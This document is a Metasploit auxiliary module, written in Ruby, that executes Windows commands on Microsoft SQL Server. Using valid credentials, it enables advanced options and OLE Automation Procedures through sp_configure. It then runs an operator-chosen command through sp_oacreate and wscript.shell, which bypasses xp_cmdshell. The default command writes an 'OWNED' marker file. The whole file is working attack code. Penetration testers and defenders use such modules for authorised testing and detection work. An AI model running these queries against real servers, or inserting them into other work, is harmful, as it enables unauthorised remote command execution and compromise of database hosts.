##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server sp_oacreate Command Execution',
      'Description'    => %q{
        This module will execute a Windows command on a MSSQL/MSDE instance
        via the sp_oacreate procedure (ole) instead of the xp_cmdshell.
        A valid username and password is required to use this module.
      },
      'Author'         => [ 'arcc <pw[at]evait.de>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql'],
        ]
    ))

    register_options( [
      OptString.new('CMD', [ false, 'Command to execute',  'cmd.exe /c echo OWNED > C:\\owned.exe']),
    ])
  end

  def run
    return unless mssql_login_datastore

    doprint = datastore['VERBOSE']
    print_status('Enable advanced options and ole automation procedures')
    mssql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", doprint)
    mssql_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", doprint)
    print_status('Executing command using sp_oacreate')
    mssql_query("DECLARE @mssql INT; EXEC sp_oacreate 'wscript.shell',@mssql OUTPUT; EXEC sp_oamethod @mssql, 'run', null, '#{datastore['CMD']}';", doprint)
  end
end
